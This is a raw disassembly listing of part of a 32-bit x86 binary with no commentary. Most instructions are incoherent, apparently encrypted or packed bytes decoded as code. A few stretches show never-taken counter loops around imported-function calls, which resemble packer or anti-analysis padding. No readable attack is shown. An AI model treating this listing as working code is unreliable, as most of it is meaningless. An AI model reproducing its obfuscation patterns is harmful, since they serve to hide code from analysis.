  4072bf:	and    eax,0x8be0558b
  4072c4:	pop    ebp
  4072c5:	clc    
  4072c6:	xor    edx,eax
  4072c8:	add    edx,ecx
  4072ca:	imul   edx,ebx
  4072cd:	cmp    edx,edi
  4072cf:	jbe    0x40619a
  4072d5:	pop    ebx
  4072d6:	jmp    0x407428
  4072db:	push   ds
  4072dc:	cld    
  4072dd:	dec    edi
  4072de:	or     ebp,DWORD PTR [ebp-0x27]
  4072e1:	jp     0x40728c
  4072e3:	adc    edi,0xe5900f0c
  4072e9:	lds    ecx,FWORD PTR [eax+edi*8+0x237e7e18]
  4072f0:	jg     0x407370
  4072f2:	jle    0x407363
  4072f4:	or     al,0x5
  4072f6:	bound  esi,QWORD PTR [ecx]
  4072f8:	jmp    0x407340
  4072fa:	mov    ecx,0x77ca7009
  4072ff:	pop    eax
  407300:	cmc    
  407301:	popf   
  407302:	and    eax,DWORD PTR [ebx+edx*8+0x3cedcf39]
  407309:	fwait
  40730a:	cli    
  40730b:	xchg   esp,eax
  40730c:	push   eax
  40730d:	jne    0x407314
  40730f:	in     eax,0xee
  407311:	mov    ecx,esi
  407313:	jp     0x4072c0
  407315:	ins    BYTE PTR es:[edi],dx
  407316:	call   0xf43ff9ff
  40731b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40731c:	jno    0x407316
  40731e:	pop    edi
  40731f:	sub    DWORD PTR [edx-0x28],edi
  407322:	xchg   DWORD PTR [edi+0x1c39a4df],eax
  407328:	ins    DWORD PTR es:[edi],dx
  407329:	push   ebp
  40732a:	js     0x407372
  40732c:	retf   
  40732d:	jo     0x407397
  40732f:	jno    0x407371
  407331:	dec    DWORD PTR [edx-0x40]
  407334:	aaa    
  407335:	mov    ebx,0x5a7390f0
  40733a:	lods   al,BYTE PTR ds:[esi]
  40733b:	scas   eax,DWORD PTR es:[edi]
  40733c:	inc    edi
  40733d:	adc    al,0x29
  40733f:	jae    0x4072ce
  407341:	repnz lods eax,DWORD PTR ds:[esi]
  407343:	jl     0x4073a5
  407345:	rol    BYTE PTR [ebx],0x79
  407348:	mov    bl,0xdf
  40734a:	fs dec esi
  40734c:	sti    
  40734d:	call   0x3648:0x4adbe3eb
  407354:	push   0x5ad5c8bf
  407359:	iret   
  40735a:	pop    esi
  40735b:	xchg   esp,eax
  40735c:	outs   dx,DWORD PTR ds:[esi]
  40735d:	push   ds
  40735e:	out    dx,eax
  40735f:	out    dx,al
  407360:	out    dx,al
  407361:	xchg   edx,eax
  407362:	mov    DWORD PTR [edx+ebx*8-0x54],ecx
  407366:	bound  eax,QWORD PTR [ecx-0xa]
  407369:	push   es
  40736a:	sbb    ecx,DWORD PTR [edi+0x69]
  40736d:	cli    
  40736e:	jmp    0x6bd6:0xe7cd0e04
  407375:	mov    dl,0xce
  407377:	sbb    eax,0x1da13146
  40737c:	fld    QWORD PTR [edi-0x54ce955c]
  407382:	cld    
  407383:	in     eax,0xb1
  407385:	call   0x4665de70
  40738a:	xchg   eax,edi
  40738c:	mov    bl,0xe1
  40738e:	in     eax,dx
  40738f:	jae    0x407326
  407391:	cdq    
  407392:	pop    esp
  407393:	add    eax,0x4867f7c2
  407398:	mov    dl,0x6d
  40739a:	cmp    BYTE PTR [eax],cl
  40739c:	xchg   ebp,eax
  40739d:	stos   BYTE PTR es:[edi],al
  40739e:	stc    
  40739f:	fdivr  st,st(5)
  4073a1:	dec    edx
  4073a2:	out    dx,al
  4073a3:	fst    QWORD PTR [esi-0x1]
  4073a6:	sahf   
  4073a7:	in     al,dx
  4073a8:	dec    esi
  4073a9:	jo     0x407402
  4073ab:	dec    edx
  4073ac:	dec    eax
  4073ad:	sbb    BYTE PTR [ecx-0x1da8c525],dh
  4073b3:	jne    0x407425
  4073b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4073b6:	fdivr  DWORD PTR [ebp+0x150f834f]
  4073bc:	cld    
  4073bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4073be:	fcom   QWORD PTR [ebx]
  4073c0:	or     bl,BYTE PTR [esi+eiz*1+0x55]
  4073c4:	sbb    eax,DWORD PTR [edi+0x3c]
  4073c7:	sub    DWORD PTR [esi-0x7acfd3cd],0x42
  4073ce:	pop    ss
  4073cf:	adc    al,0xa5
  4073d1:	repz cmp bh,BYTE PTR [edi]
  4073d4:	push   ss
  4073d5:	cdq    
  4073d6:	adc    dl,BYTE PTR [edi-0x1b81e829]
  4073dc:	mov    cl,0x97
  4073de:	jo     0x4073e2
  4073e0:	imul   edi,DWORD PTR [ebp+0x1],0x0
  4073e4:	xor    DWORD PTR [eax+0x58],ebx
  4073e7:	xchg   edx,eax
  4073e8:	sbb    ch,BYTE PTR [edi+ecx*8+0x17d21b93]
  4073ef:	ins    BYTE PTR es:[edi],dx
  4073f0:	cmp    ah,BYTE PTR [ecx]
  4073f2:	push   ss
  4073f3:	jp     0x4073bf
  4073f5:	adc    eax,0xb90b377e
  4073fa:	sar    BYTE PTR [edi+0x6d757db2],0xcc
  407401:	lahf   
  407402:	retf   0x47d6
  407405:	xor    eax,0x2c032c00
  40740a:	mov    al,0x2e
  40740d:	sbb    eax,0x2e10f9f0
  407412:	adc    al,0x3e
  407414:	popa   
  407415:	or     DWORD PTR [esi+0x37],ecx
  407418:	pop    esi
  407419:	push   0x63c66193
  40741e:	push   edx
  40741f:	mov    eax,0xb6879a0d
  407424:	or     esi,ebp
  407426:	js     0x4074a0
  407428:	pop    edi
  407429:	leave  
  40742a:	ret    0x8
  40742d:	push   ebp
  40742e:	mov    ebp,esp
  407430:	jmp    0x4075bc
  407435:	jb     0x407447
  407437:	test   eax,0x8a95a91d
  40743c:	adc    DWORD PTR [ebp+eax*1-0x6748d801],edi
  407443:	pop    ss
  407444:	out    0xad,eax
  407446:	sbb    DWORD PTR [esi+0x7e],edi
  407449:	jmp    0x59bef2cd
  40744e:	or     DWORD PTR [eax+edi*2],esi
  407451:	mov    ah,0x80
  407453:	sbb    al,0xed
  407455:	adc    BYTE PTR [esi-0x4d91064f],ch
  40745b:	leave  
  40745c:	push   edi
  40745d:	or     eax,0xb0608191
  407462:	inc    eax
  407463:	sbb    bl,bl
  407465:	jle    0x40749a
  407467:	int3   
  407468:	cli    
  407469:	and    edx,DWORD PTR [edx]
  40746b:	neg    BYTE PTR [ecx]
  40746d:	aaa    
  40746e:	lods   eax,DWORD PTR ds:[esi]
  40746f:	inc    edi
  407470:	sub    bh,BYTE PTR [edx-0x19d3f8ad]
  407476:	ja     0x407415
  407478:	pop    ebp
  407479:	jge    0x4074e8
  40747b:	bound  esi,QWORD PTR [esi]
  40747d:	int3   
  40747e:	div    esi
  407480:	arpl   WORD PTR [edi-0x7c],di
  407483:	pop    esp
  407484:	add    al,0xb1
  407486:	js     0x40744e
  407488:	pop    ebx
  407489:	test   al,0x36
  40748b:	in     al,0xdf
  40748d:	fucomi st,st(7)
  40748f:	dec    edx
  407490:	sbb    BYTE PTR [edi+eiz*8],bh
  407493:	mov    edi,0x8f9970fb
  407498:	(bad)  
  407499:	aam    0x17
  40749b:	pop    esi
  40749c:	inc    ebx
  40749d:	stc    
  40749e:	add    BYTE PTR [esi+ebp*4+0x1469ad88],bh
  4074a5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4074a6:	and    DWORD PTR [ebx],edi
  4074a8:	fist   DWORD PTR [ecx+0x5c]
  4074ab:	aas    
  4074ac:	mov    dl,0xc3
  4074ae:	stc    
  4074af:	mov    DWORD PTR [edi+0x4],esi
  4074b2:	sub    BYTE PTR [ebp-0x12],0xa0
  4074b6:	repz cli 
  4074b8:	fsubr  DWORD PTR [eax-0x71]
  4074bb:	ret    
  4074bc:	fisttp DWORD PTR [ebx]
  4074be:	sub    eax,0x6239f82e
  4074c3:	out    0x34,eax
  4074c5:	setl   al
  4074c8:	pop    ds
  4074c9:	stc    
  4074ca:	mov    edx,DWORD PTR [edx]
  4074cc:	or     DWORD PTR [ecx],0xffffffcc
  4074cf:	into   
  4074d0:	rol    BYTE PTR [esi+0x1c],1
  4074d3:	sbb    al,0x87
  4074d5:	inc    edi
  4074d6:	push   ebp
  4074d7:	pushf  
  4074d8:	ins    DWORD PTR es:[edi],dx
  4074d9:	test   DWORD PTR [ebx],ebp
  4074db:	ret    
  4074dc:	push   edi
  4074dd:	pushf  
  4074de:	rcr    dl,cl
  4074e0:	sbb    bl,0x89
  4074e3:	xchg   esi,eax
  4074e4:	xor    bl,bl
  4074e6:	out    dx,eax
  4074e7:	lahf   
  4074e8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4074e9:	clc    
  4074ea:	test   eax,0x99f644d9
  4074ef:	mov    ds:0x25d5c139,eax
  4074f4:	dec    ebx
  4074f5:	icebp  
  4074f6:	adc    eax,0x7149a164
  4074fb:	jl     0x407527
  4074fd:	xlat   BYTE PTR ds:[ebx]
  4074fe:	cmp    al,0x6c
  407500:	cmp    eax,0x5d918b25
  407505:	add    BYTE PTR ds:0xfbc9e755,0x90
  40750c:	jl     0x407553
  40750e:	popf   
  40750f:	fmul   DWORD PTR [esi+0x2e]
  407512:	sub    bl,BYTE PTR [edi-0x5b3ab7f3]
  407518:	fdivrp st(0),st
  40751a:	mov    bh,0x5f
  40751c:	lahf   
  40751d:	sbb    eax,0x2f271831
  407522:	mov    ebp,0x604868d7
  407527:	push   edx
  407528:	sti    
  407529:	ficomp WORD PTR [edx+0x2]
  40752c:	fistp  DWORD PTR [ebp+0x26]
  40752f:	dec    esp
  407530:	sub    ch,BYTE PTR [edi+eax*8-0x50b073ed]
  407537:	xchg   esi,eax
  407538:	or     eax,0x9a369d88
  40753d:	adc    bl,BYTE PTR [edx+edx*1+0x7121a55b]
  407544:	sub    al,0xe3
  407546:	sub    DWORD PTR [eax+0xe],eax
  407549:	test   DWORD PTR ds:[ecx-0x78],esp
  40754d:	aas    
  40754e:	mov    edi,esp
  407550:	test   BYTE PTR [esi-0x73],ch
  407553:	mov    esi,0x8d8b2d12
  407558:	or     al,0x55
  40755a:	sbb    eax,0xe3b70eb3
  40755f:	xchg   ebp,eax
  407560:	call   0x78b1:0xd41e
  407566:	xor    ebx,DWORD PTR [esi-0x24]
  407569:	or     al,0xff
  40756b:	loope  0x40756c
  40756d:	test   al,0x4d
  40756f:	cmp    ebp,0xffffffb4
  407572:	int3   
  407573:	jp     0x4075dd
  407575:	sbb    DWORD PTR [ebp-0x5216fb54],esp
  40757b:	inc    ecx
  40757c:	xchg   edi,eax
  40757d:	loope  0x4075fd
  40757f:	sar    DWORD PTR [edi+0x66],1
  407582:	sub    DWORD PTR [edx-0x27fc2322],edi
  407588:	mov    ah,0x66
  40758a:	daa    
  40758b:	leave  
  40758c:	clc    
  40758d:	mov    dh,0x5e
  40758f:	add    cl,al
  407591:	or     eax,ebx
  407593:	xchg   edx,eax
  407594:	pop    edi
  407595:	cmp    eax,0x189102f5
  40759a:	xor    eax,0x63c6529c
  40759f:	adc    eax,0x47248c37
  4075a4:	sbb    DWORD PTR [ebx+0x50],ebp
  4075a7:	inc    esp
  4075a8:	xor    DWORD PTR [edx-0x65559b9],edi
  4075ae:	les    esp,FWORD PTR [ebx]
  4075b0:	push   edx
  4075b1:	pusha  
  4075b2:	mov    ds:0xeb96a401,al
  4075b7:	pop    edi
  4075b8:	(bad)  
  4075ba:	push   es
  4075bb:	adc    dl,BYTE PTR [ecx+0x51]
  4075be:	and    DWORD PTR ds:0x41abce,0x0
  4075c8:	jmp    0x4075da
  4075cd:	mov    edx,DWORD PTR ds:0x41abce
  4075d3:	inc    edx
  4075d4:	mov    DWORD PTR ds:0x41abce,edx
  4075da:	cmp    DWORD PTR ds:0x41abce,0x1e
  4075e1:	jae    0x407619
  4075e7:	cmp    DWORD PTR ds:0x41abce,0x20
  4075ee:	jne    0x40760a
  4075f4:	push   DWORD PTR [ebp-0x28]
  4075f7:	push   0x365e
  4075fc:	push   DWORD PTR [ebp-0x18]
  4075ff:	push   0x4c62
  407604:	call   DWORD PTR ds:0x40d004
  40760a:	jmp    0x4075cd
  40760f:	xor    DWORD PTR ds:0x412374,0x3a52
  407619:	mov    eax,0xf89c8538
  40761e:	sub    ecx,ecx
  407620:	mov    DWORD PTR [ebp-0x8],eax
  407623:	and    DWORD PTR ds:0x41abd6,0x0
  40762d:	jmp    0x40763f
  407632:	mov    ecx,DWORD PTR ds:0x41abd6
  407638:	inc    ecx
  407639:	mov    DWORD PTR ds:0x41abd6,ecx
  40763f:	cmp    DWORD PTR ds:0x41abd6,0x1e
  407646:	jae    0x4076c6
  40764c:	cmp    DWORD PTR ds:0x41abd6,0x2d
  407653:	jne    0x40765f
  407659:	call   DWORD PTR ds:0x40d1d8
  40765f:	jmp    0x407632
  407664:	and    DWORD PTR ds:0x417e45,0x0
  40766e:	jmp    0x407680
  407673:	mov    edx,DWORD PTR ds:0x417e45
  407679:	inc    edx
  40767a:	mov    DWORD PTR ds:0x417e45,edx
  407680:	cmp    DWORD PTR ds:0x417e45,0x1b
  407687:	jae    0x4076c6
  40768d:	cmp    DWORD PTR ds:0x417e45,0x8
  407694:	jne    0x4076a5
  40769a:	push   0x41abea
  40769f:	call   DWORD PTR ds:0x40d1dc
  4076a5:	cmp    DWORD PTR ds:0x417e45,0x7
  4076ac:	jne    0x4076c1
  4076b2:	xor    edx,edx
  4076b4:	add    edx,DWORD PTR ds:0x417e45
  4076ba:	inc    edx
  4076bb:	mov    DWORD PTR ds:0x417e45,edx
  4076c1:	jmp    0x407673
  4076c6:	mov    DWORD PTR [ebp-0x4],0xf89c853b
  4076cd:	mov    edx,DWORD PTR [ebp-0x8]
  4076d0:	push   esi
  4076d1:	adc    esi,ecx
  4076d3:	mov    ecx,0x7510859
  4076d8:	xor    edx,ecx
  4076da:	mov    esi,0x32729f
  4076df:	push   edi
  4076e0:	mov    edi,DWORD PTR [ebp+0x10]
  4076e3:	add    edx,esi
  4076e5:	cmp    edi,edx
  4076e7:	jmp    0x407873
  4076ec:	iret   
  4076ed:	in     eax,0x74
  4076ef:	push   edx
  4076f0:	adc    al,0x63
  4076f2:	jns    0x40776d
  4076f4:	int    0x3e
  4076f6:	les    ebp,FWORD PTR [esi+0x14]
  4076f9:	mov    dl,BYTE PTR [ebx-0x2e]
  4076fc:	sbb    al,0x1f
  4076fe:	jle    0x40777e
  407700:	jmp    0xe5bef584
  407705:	into   
  407706:	push   es
  407707:	xor    BYTE PTR [edi],ah
  407709:	sub    BYTE PTR [edi*1+0x28f8c9df],dh
  407710:	or     al,0xf9
  407712:	imul   edx,DWORD PTR [ecx+0x7546eb96],0x1390210f
  40771c:	bswap  ebp
  40771e:	or     eax,0x494507e6
  407723:	mov    di,0x4ea9
  407727:	test   BYTE PTR ds:0xbca8b6f1,bh
  40772d:	mov    al,ds:0x841cf0db
  407732:	and    edi,DWORD PTR [ebp-0x5152aafa]
  407738:	sbb    eax,0x917dce69
  40773d:	(bad)  
  40773e:	retf   0x5141
  407741:	idiv   BYTE PTR [eax+0x695f2685]
  407747:	add    edi,DWORD PTR [ecx-0x10d14592]
  40774d:	loopne 0x4077a7
  40774f:	fisub  WORD PTR [ebx-0x53]
  407752:	inc    esp
  407753:	lds    ebx,FWORD PTR [edx+0x72]
  407756:	mov    ecx,0x1ab8aa1a
  40775b:	nop
  40775c:	and    eax,0xc7ef7a50
  407761:	add    ebp,ecx
  407763:	mov    BYTE PTR [ecx+0x356a6e2e],ah
  407769:	xor    edi,DWORD PTR [ecx]
  40776b:	int    0xcd
  40776d:	test   BYTE PTR [edx],bh
  40776f:	repz jmp 0xd58e:0xa89d871c
  407777:	bound  ebx,QWORD PTR [ecx-0x7c]
  40777a:	push   ds
  40777b:	ficom  WORD PTR [esi-0x37]
  40777e:	arpl   WORD PTR [edx-0x63c9e4cb],cx
  407784:	js     0x407775
  407786:	pop    esp
  407787:	mov    al,ds:0xc12862e
  40778c:	adc    al,0x2e
  40778e:	mov    eax,ds:0x3b9f104b
  407793:	and    BYTE PTR [ebx+0x301c8c7d],al
  407799:	pop    esp
  40779a:	fistp  WORD PTR ds:0xe83caf29
  4077a0:	and    bl,ah
  4077a2:	(bad)  
  4077a3:	mov    BYTE PTR [edi+0x2a415351],bl
  4077a9:	mov    al,ds:0xe69b2dd4
  4077ae:	leave  
  4077af:	xor    eax,esp
  4077b1:	mov    eax,0x9ef17c5c
  4077b6:	adc    edi,DWORD PTR [ecx+0x11]
  4077b9:	dec    ebx
  4077ba:	jg     0x4077c7
  4077bc:	fadd   st(3),st
  4077be:	js     0x40781a
  4077c0:	sbb    eax,0x3605b46b
  4077c5:	push   esi
  4077c6:	mov    al,0x2
  4077c8:	and    dh,BYTE PTR [edx]
  4077ca:	rcr    BYTE PTR [ecx],cl
  4077cc:	hlt    
  4077cd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4077ce:	xchg   edx,eax
  4077cf:	xchg   esi,eax
  4077d0:	in     al,0x76
  4077d2:	mov    dl,0xff
  4077d4:	in     al,0x26
  4077d6:	shl    BYTE PTR [esi],1
  4077d8:	mov    ds,WORD PTR [ecx-0x33d94911]
  4077de:	add    al,0x4d
  4077e0:	test   BYTE PTR [edi],ch
  4077e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4077e3:	mov    ?,WORD PTR [eax+ebp*4-0x24]
  4077e7:	inc    ebx
  4077e8:	add    BYTE PTR [edx],0xb6
  4077eb:	cs and dl,dh
  4077ee:	push   ebp
  4077ef:	popa   
  4077f0:	ja     0x40777a
  4077f2:	xor    eax,0x659d1bb8
  4077f7:	mov    ecx,0x2b0c6010
  4077fc:	adc    eax,0xe2b5f9b7
  407801:	cdq    
  407802:	mov    al,0xd2
  407804:	daa    
  407805:	inc    ebp
  407806:	cmc    
  407807:	cmp    esp,eax
  407809:	stc    
  40780a:	je     0x4077ef
  40780c:	outs   dx,DWORD PTR ds:[esi]
  40780d:	jb     0x4077b7
  40780f:	mov    edi,0xae87762e
  407814:	push   esp
  407815:	jg     0x40783b
  407817:	imul   edx,DWORD PTR [ebp+0x71],0xec9a20f6
  40781e:	add    BYTE PTR [ecx+eiz*1+0x68654188],ch
  407825:	aad    0xed
  407827:	add    eax,0xd0cda383
  40782c:	mov    cl,0x75
  40782e:	adc    esp,DWORD PTR [edx]
  407830:	sbb    al,0x8
  407832:	mov    bl,0x43
  407834:	xchg   esi,eax
  407835:	jnp    0x40786c
  407837:	fs mov ecx,0xba99c3b5
  40783d:	sbb    ebx,edx
  40783f:	mov    ds:0x6cf5decf,al
  407844:	mov    gs,esi
  407846:	pusha  
  407847:	pop    ecx
  407848:	call   0xfa03ca4a
  40784d:	mov    ds:0x8a78c0ad,al
  407852:	or     al,0xca
  407854:	add    dl,BYTE PTR [esi]
  407856:	call   DWORD PTR [ebx+edx*1]
  407859:	push   ss
  40785a:	fwait
  40785b:	dec    edx
  40785c:	out    0x6d,eax
  40785e:	rcr    BYTE PTR [ebx],0xb7
  407861:	sbb    eax,0xcf1d1d8e
  407866:	adc    DWORD PTR [edi],esi
  407868:	mov    ch,0xfe
  40786a:	jp     0x407889
  40786c:	iret   
  40786d:	imul   BYTE PTR [esi+0xf268e09]
  407873:	je     0x407c04
  407879:	jmp    0x407a05
  40787e:	in     eax,dx
  40787f:	(bad)  
  407880:	pop    esi
  407881:	jg     0x4078d7
  407883:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407884:	ins    DWORD PTR es:[edi],dx
  407885:	in     eax,0x5e
  407887:	imul   eax,DWORD PTR [esi-0x32bf3274],0xfffffff9
  40788e:	(bad)  
  40788f:	sbb    al,0x7e
  407891:	jle    0x40787c
  407893:	jg     0x407913
  407895:	jle    0x407881
  407897:	xor    eax,0xd5aa1958
  40789c:	int    0xaa
  40789e:	scas   eax,DWORD PTR es:[edi]
  40789f:	(bad)
  4078a2:	sbb    ah,bh
  4078a4:	imul   edi,DWORD PTR [edi],0xffffff95
  4078a7:	dec    edx
  4078a8:	sub    BYTE PTR [ebp-0x31],al
  4078ab:	pop    ebx
  4078ac:	adc    al,0x1
  4078ae:	pop    eax
  4078af:	mov    cl,0xac
  4078b1:	push   0x7a
  4078b3:	inc    esp
  4078b4:	ficomp WORD PTR [edi+0x5a]
  4078b7:	mov    esi,0xdf2193cf
  4078bc:	mov    ecx,0x199f5b05
  4078c1:	popa   
  4078c2:	ss dec eax
  4078c4:	cmp    al,0xaa
  4078c6:	cmp    eax,esi
  4078c8:	or     ebx,DWORD PTR [ebx+0x4d]
  4078cb:	jmp    0x281a89f7
  4078d0:	adc    BYTE PTR ds:0x53ccc146,bh
  4078d6:	(bad)  
  4078d7:	pop    ebx
  4078d8:	in     al,0x61
  4078da:	or     DWORD PTR [edx-0x75],0xffffffd5
  4078de:	push   cs
  4078df:	xor    ebp,ebp
  4078e1:	cmp    bh,BYTE PTR [eax+0x8f2ca07]
  4078e7:	(bad)  
  4078e8:	ret    
  4078e9:	mov    ah,0x7c
  4078eb:	lea    esp,[ebx-0x3a]
  4078ee:	outs   dx,DWORD PTR es:[esi]
  4078f0:	lahf   
  4078f1:	les    edx,FWORD PTR [edi-0x7f262b3e]
  4078f7:	xor    edi,esp
  4078f9:	xchg   esi,eax
  4078fa:	mov    ebx,0xf0a208a6
  4078ff:	loope  0x407894
  407901:	xor    edi,ebx
  407903:	xor    DWORD PTR [eax],0x44
  407906:	aad    0x2b
  407908:	inc    esi
  407909:	mov    ch,0x5f
  40790b:	sahf   
  40790c:	fnsave [ebx-0x4c0e57a7]
  407912:	fmul   QWORD PTR [edi+0x7a]
  407915:	push   ebx
  407916:	lods   eax,DWORD PTR ds:[esi]
  407917:	stos   BYTE PTR es:[edi],al
  407918:	(bad)  
  407919:	push   es
  40791a:	mov    eax,ds:0x17f23d00
  40791f:	scas   al,BYTE PTR es:[edi]
  407920:	scas   al,BYTE PTR es:[edi]
  407921:	mov    ebp,0x71028e92
  407926:	movaps XMMWORD PTR [ebp+0x21],xmm1
  40792a:	inc    ebx
  40792b:	ins    BYTE PTR es:[edi],dx
  40792c:	repz push 0x2e
  40792f:	push   esp
  407930:	and    esi,eax
  407932:	test   ah,cl
  407934:	clc    
  407935:	in     eax,0x4e
  407937:	call   0x3789:0x635fc4e5
  40793e:	je     0x407923
  407940:	push   ebp
  407941:	arpl   WORD PTR [ebp+0x14],ax
  407944:	and    DWORD PTR [edi+ecx*2+0x15],0xa8946958
  40794c:	shr    bl,1
  40794e:	dec    ebx
  40794f:	std    
  407950:	inc    ebp
  407951:	jp     0x4079a2
  407953:	ret    0xf08a
  407956:	aaa    
  407957:	push   0xfa4104ed
  40795c:	aas    
  40795d:	xchg   edx,eax
  40795e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40795f:	imul   ebp,DWORD PTR [edx-0x433515cf],0xa912c94d
  407969:	cmp    edi,DWORD PTR [eax+0x35436b28]
  40796f:	(bad)  
  407970:	aam    0x6c
  407972:	mov    esp,0xcf0f8574
  407977:	jge    0x407962
  407979:	das    
  40797a:	scas   eax,DWORD PTR es:[edi]
  40797b:	inc    ebp
  40797c:	push   0x6c
  40797e:	test   BYTE PTR [edx+ebp*8],dl
  407981:	pop    eax
  407982:	xlat   BYTE PTR ds:[ebx]
  407983:	push   es
  407984:	imul   ebx,DWORD PTR [ebx-0x70],0x33d0f8b7
  40798b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40798c:	mov    ds,WORD PTR [ecx+0x477094ec]
  407992:	jge    0x407967
  407994:	adc    eax,DWORD PTR ds:0xa1fac893
  40799a:	xchg   edx,eax
  40799b:	fwait
  40799c:	aaa    
  40799d:	and    DWORD PTR [ebx+0x4],0x57
  4079a1:	outs   dx,BYTE PTR ds:[esi]
  4079a2:	stos   DWORD PTR es:[edi],eax
  4079a3:	sbb    cl,BYTE PTR [ebx]
  4079a5:	inc    esi
  4079a6:	(bad)  
  4079a7:	retf   0x9c4d
  4079aa:	push   ds
  4079ab:	add    bl,bh
  4079ad:	es pop esi
  4079af:	adc    al,0x80
  4079b1:	ss repnz dec ebp
  4079b4:	aad    0x3c
  4079b6:	je     0x40794a
  4079b8:	cmp    BYTE PTR [ebp-0x61a53880],dl
  4079be:	aas    
  4079bf:	pop    eax
  4079c0:	clc    
  4079c1:	in     al,0xfb
  4079c3:	or     al,0x74
  4079c5:	adc    al,BYTE PTR [esi-0x9cff290]
  4079cb:	or     bl,BYTE PTR [ebp-0xf]
  4079ce:	shl    dh,cl
  4079d0:	fimul  DWORD PTR [ebp+0x45]
  4079d3:	inc    ebp
  4079d4:	mov    al,0x9c
  4079d6:	push   ds
  4079d7:	sbb    eax,0x4785f4a1
  4079dc:	in     al,0x15
  4079de:	loopne 0x407994
  4079e0:	aam    0xb2
  4079e2:	hlt    
  4079e3:	inc    edx
  4079e4:	adc    BYTE PTR [ecx+0x3b],dh
  4079e7:	lahf   
  4079e8:	sub    esp,0xfffffffe
  4079eb:	sbb    DWORD PTR [ebp-0x1c],ebx
  4079ee:	repnz rol DWORD PTR [edi*1+0x43b05cdb],0xd0
  4079f7:	mov    cl,0x2a
  4079f9:	xor    BYTE PTR [ecx],bh
  4079fb:	stc    
  4079fc:	or     eax,0x2360ec75
  407a01:	xlat   BYTE PTR ds:[ebx]
  407a02:	fucom  st(6)
  407a04:	xchg   ebx,eax
  407a05:	mov    edx,DWORD PTR [ebp-0x8]
  407a08:	mov    eax,DWORD PTR [ebp-0x4]
  407a0b:	xor    eax,ecx
  407a0d:	mov    edi,0xffcd8d61
  407a12:	sub    edi,eax
  407a14:	jmp    0x407ba0
  407a19:	les    edi,FWORD PTR [eax]
  407a1b:	add    ch,BYTE PTR [edi-0x1e]
  407a1e:	gs jns 0x4079da
  407a21:	dec    esp
  407a22:	hlt    
  407a23:	sbb    BYTE PTR [ecx-0x35],0x90
  407a27:	inc    esp
  407a29:	jle    0x407a3d
  407a2b:	jle    0x407aab
  407a2d:	jmp    0x8bef8b1
  407a32:	mov    edi,0x9b17f871
  407a37:	out    dx,eax
  407a38:	lock push ebp
  407a3a:	sbb    al,0x69
  407a3c:	push   esp
  407a3d:	out    dx,al
  407a3e:	(bad)  
  407a3f:	cdq    
  407a40:	aaa    
  407a41:	adc    BYTE PTR [eax],dl
  407a43:	popa   
  407a44:	adc    al,0xfc
  407a46:	pop    ds
  407a47:	jmp    0x1afb:0xde956acc
  407a4e:	mov    edx,0x51e3b420
  407a53:	sbb    eax,0x12557ce0
  407a58:	mov    ebx,0x45da65c9
  407a5d:	int    0x7f
  407a5f:	adc    BYTE PTR [ebx],al
  407a61:	loope  0x407a55
  407a63:	and    ah,BYTE PTR [eax+0x20]
  407a66:	push   ebp
  407a67:	sbb    edi,DWORD PTR [edi-0x4330c8b7]
  407a6d:	mov    cs,esi
  407a6f:	push   ebx
  407a70:	int3   
  407a71:	jl     0x407a3a
  407a73:	adc    al,0x54
  407a75:	add    DWORD PTR [eiz*8+0x6da902d],ebx
  407a7c:	xor    eax,0xdcd4e22
  407a81:	xor    ebx,DWORD PTR [ebp+0x9]
  407a84:	push   edi
  407a85:	gs in  al,dx
  407a87:	rcr    ah,1
  407a89:	pop    edi
  407a8a:	xchg   edi,eax
  407a8b:	add    DWORD PTR [edi+0x40],ecx
  407a8e:	test   DWORD PTR [ecx+0x19d233cf],esi
  407a94:	sar    DWORD PTR [ecx+ebp*8-0x49],cl
  407a98:	sbb    BYTE PTR [ecx],bh
  407a9a:	gs je  0x407a63
  407a9d:	or     eax,0xa23bd475
  407aa2:	pop    ecx
  407aa3:	int    0x51
  407aa5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407aa6:	adc    al,0x35
  407aa8:	inc    edi
  407aa9:	and    edi,eax
  407aab:	or     ch,BYTE PTR [edi-0x59]
  407aae:	push   ebx
  407aaf:	cmp    edi,esi
  407ab1:	sbb    bl,BYTE PTR [esi+0x6d]
  407ab4:	jecxz  0x407a36
  407ab6:	pusha  
  407ab7:	cld    
  407ab8:	ins    BYTE PTR es:[edi],dx
  407ab9:	mov    ch,0x7c
  407abb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407abc:	cmp    ch,BYTE PTR [ebx]
  407abe:	retf   0x4c39
  407ac1:	std    
  407ac2:	push   ebx
  407ac3:	retf   
  407ac4:	in     al,0xde
  407ac6:	sahf   
  407ac7:	inc    ebp
  407ac8:	test   BYTE PTR [ebp+0x0],bh
  407acb:	fdivr  DWORD PTR [eax]
  407acd:	rcr    DWORD PTR [ecx+ecx*2],0xd1
  407ad1:	xchg   esi,eax
  407ad2:	and    BYTE PTR [ebx+ebp*4],dl
  407ad5:	push   edi
  407ad6:	dec    edx
  407ad7:	jne    0x407af1
  407ad9:	int3   
  407ada:	push   es
  407adb:	(bad)  
  407adc:	xor    ch,dl
  407ade:	fidivr DWORD PTR [eax-0x45]
  407ae1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407ae2:	mov    esp,edi
  407ae4:	call   0xa3d0:0x56f91249
  407aeb:	mov    esi,0x6b1165f5
  407af0:	xor    eax,0x30872537
  407af5:	lea    ebx,[esp+esi*8-0x17]
  407af9:	sahf   
  407afa:	mov    dl,0x3a
  407afc:	jl     0x407ab1
  407afe:	dec    ebx
  407aff:	jp     0x407a8f
  407b01:	leave  
  407b02:	add    ah,cl
  407b04:	cmp    DWORD PTR [ebp-0x13],ecx
  407b07:	ficom  DWORD PTR [esi-0x519fa258]
  407b0d:	adc    BYTE PTR [edi+0x3],dl
  407b10:	arpl   WORD PTR [ebx],si
  407b12:	je     0x407b57
  407b14:	fmul   QWORD PTR ds:0xeeb88a4
  407b1a:	xor    eax,0xd3a7e838
  407b1f:	scas   eax,DWORD PTR es:[edi]
